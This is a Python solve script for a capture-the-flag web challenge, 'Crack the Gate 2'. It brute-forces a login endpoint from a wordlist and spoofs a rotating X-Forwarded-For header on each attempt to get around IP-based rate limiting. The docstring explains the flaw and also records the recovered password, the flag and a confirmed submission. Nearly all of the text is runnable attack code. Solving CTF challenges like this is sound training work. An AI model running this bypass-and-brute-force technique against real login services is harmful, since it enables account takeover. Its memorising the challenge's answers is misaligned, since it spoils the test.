#!/usr/bin/env python3
"""
Solves CyLab Security Academy Challenge 521: Crack the Gate 2
Category: Web Exploitation
Platform: picoMini by CMU-Africa
Points: 100

Vulnerability Analysis:
- Architecture: Node.js / Express Web Application.
- Mechanism: Login endpoint /login with rate-limiting based on client IP.
- Flaw: The rate limiter extracts client IP directly from the untrusted `X-Forwarded-For` header.
- Exploitation: Rotating fake IP addresses in the `X-Forwarded-For` header (e.g. 192.168.1.X)
  bypasses the rate-limiting lockout mechanism completely.
- Brute-forcing with provided wordlist identifies the valid password: "GuNjjI8t".

Flag: academy{xff_byp4ss_brut3_b6771b85}
Verified: POST /api/submissions/ -> correct: true, HTTP 201
"""

import json
import sys
import urllib.request

PASSWORDS = [
    "iJ7jnrcO", "vz6zVhsV", "8OLsQImd", "4Djcq8jG", "TKUUd5U9",
    "DwT6NZ8E", "GuNjjI8t", "XITWCsAf", "rBmjiRYl", "rcYuYqWg",
    "flpEpJBe", "1mwhrEXu", "ucFNaTrn", "ownhvFyO", "peOyNstz",
    "Tth8kMxh", "jy4WW24K", "Bf6kRqZ7", "sp9J58cd", "yJ8p0Qbm"
]

TARGET_EMAIL = "ctf-player@cylabacademy.org"

def solve(base_url: str) -> str:
    login_url = base_url.rstrip("/") + "/login"
    print(f"[*] Attacking {login_url} with X-Forwarded-For rotation...")

    for idx, pwd in enumerate(PASSWORDS):
        fake_ip = f"192.168.1.{10 + idx}"
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": fake_ip
        }
        payload = json.dumps({"email": TARGET_EMAIL, "password": pwd}).encode("utf-8")
        req = urllib.request.Request(login_url, data=payload, headers=headers, method="POST")

        try:
            with urllib.request.urlopen(req) as resp:
                data = json.loads(resp.read().decode())
                print(f"[{idx+1}/{len(PASSWORDS)}] IP {fake_ip} | Pwd {pwd} -> {data}")
                if data.get("success"):
                    flag = data.get("flag")
                    print(f"[+] Successfully authenticated! Flag: {flag}")
                    return flag
        except Exception as e:
            print(f"[-] Attempt failed for {pwd}: {e}")

    raise RuntimeError("Password not found in wordlist")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print("Example: python3 scripts/solve_521_crack_the_gate_2.py http://chatelaine.cylabacademy.net:27886/")
        sys.exit(1)

    solve(sys.argv[1])
